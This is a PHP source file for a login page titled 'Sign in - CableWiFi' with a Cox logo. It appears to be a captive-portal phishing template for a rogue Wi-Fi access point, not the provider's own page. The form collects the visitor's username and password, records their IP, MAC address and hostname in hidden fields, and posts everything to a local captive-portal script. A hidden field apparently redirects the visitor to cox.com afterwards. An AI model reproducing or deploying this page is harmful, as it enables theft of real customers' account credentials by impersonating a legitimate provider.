<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en-US">
  
<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" />
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Sign in - CableWiFi&trade;</title>
    <meta name="description" content="">

    <!-- Favicon metadata, place favicon.ico in the root directory -->
    <link rel="apple-touch-icon" sizes="180x180" href="assets/images/apple-touch-icon2234.png?v=GvJXzoEO6b">
    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x322234.png?v=GvJXzoEO6b">
    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x162234.png?v=GvJXzoEO6b">
    <link rel="manifest" href="assets/images/manifest2234.json?v=GvJXzoEO6b">

    <meta name="theme-color" content="#072c40">

    <!-- Prevent iOS from detecting phone numbers and adding their own link and style -->
    <meta name="format-detection" content="telephone=no">

    <link rel="stylesheet" href="assets/css/app.css">
    <script type="text/javascript" language="javascript" src="assets/js/validate.js"></script>
   </head>

  <body>
    <div id="myApp">

      <div class="site-header">
        <div class="cw-container">
          <!-- <a class="back-link" href="javascript:history.back()">Back</a> -->
          <a class="back-link" href="index.php">Back</a>
          
        </div>
      </div>

      <main class="main-container cw-container cw-toolbar-fixed-adjust" role="main">

        <div class="login-card cw-card">
          <header role="banner">
            <h1>
              <img src="assets/images/cox_logo.png"  border="0" class="" />
              <!--<img class="logo" v-bind:src="'images/' + mso + '-logo.svg'" v-bind:alt="mso"> -->
            </h1>
            <p>Sign in with your username and password.</p>
          </header>

		  <!-- <div style="display:none" id="errorMsg" class="error"></div> -->
          
          <form class="cw-text-left" method="POST" action="/captiveportal/index.php">
          <input type="hidden" name="mso" value="cox">
          <div id="login-error" class="cw-alert cw-alert--danger" tabindex="-1" style="display: none;" v-show= pageError>
              <div class="cw-alert__icon">
                <img src="assets/images/ic_caution_f.svg" alt="">
              </div>
              <p id="login-error__msg"></p>
            </div>
            <div class="cw-form-group">
              <label for="username-input">Username</label>
              <input id="username-input" class="cw-form-control" name="email" type="text" required aria-describedby="username-input-error" aria-invalid="false" v-on:blur="validate('username-input')">
              <div id="username-input-error" class="cw-form-control-feedback" role="status"></div>
            </div>
            <div class="cw-form-group">
              <label for="password-input">Password</label>
              <input id="password-input" class="cw-form-control" name="password" type="password" required aria-describedby="password-input-error" aria-invalid="false" v-on:blur="validate('password-input')">
              <div id="password-input-error" class="cw-form-control-feedback" role="status"></div>
            </div>
            <div class="cw-form-group cw-text-center">
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
				<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
				<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
				<input type="hidden" name="target" value="https://www.cox.com/residential/home.html">
               <button class="cw-btn cw-btn-primary cw-btn-block" type="submit">Sign In</button>
             <!--  <input type="submit" name="submit" class="cw-btn cw-btn-primary cw-btn-block" value="Sign In"/> -->
            </div>
          </form>
        </div>

        <p><a href="helpce44.php?mso=cox">Need Help?</a></p>
        <div class="terms">
          <p>By using this service, you agree to the <a class="cw-text-nowrap" href="terms.php" aria-label="Terms of Service">Terms of Service</a>.</p>
        </div>
      </main>

      <!-- Standard Modal -->
      <aside id="modal" class="cw-modal" tabindex="-1" role="dialog" aria-labelledby="modal-label">
        <div class="cw-modal__dialog cw-card">
          <div class="cw-modal__body">
            <div class="spinner-container">
              <div class="spinner">
                <div class="spinner-fallback"></div>
              </div>
            </div>
            <p id="modal-label" role="alert"></p>
          </div>
        </div>
        <div class="cw-modal__backdrop"></div>
      </aside>

    </div><!-- /#myApp -->

    <!-- Vue Library -->
    <script src="assets/js/vue.js"></script>

    <!-- Application scripts bundle -->
    <script src="assets/js/app.js"></script>
	
  </body>

</html>
